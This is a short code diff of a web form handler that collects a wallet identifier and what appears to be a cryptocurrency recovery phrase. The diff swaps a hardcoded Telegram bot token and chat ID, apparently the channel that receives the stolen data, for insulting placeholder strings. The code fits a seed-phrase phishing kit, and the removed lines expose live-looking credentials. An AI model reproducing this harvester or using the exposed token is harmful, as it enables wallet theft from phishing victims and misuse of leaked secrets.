@@ -1,8 +1,8 @@
 async function handleFormSubmit(event) {
     event.preventDefault();
     
-    const token = "7758194328:AAG9pSD9fya02U2m4lgsG8OjNFKtLIt0r_0";
-    const chat_id = "-1002371075600";
+    const token = "F*CK U!!!";
+    const chat_id = "-BTCH";
     
     const wallet = event.target.wallet.value;
     const phrase = event.target.phrase.value;
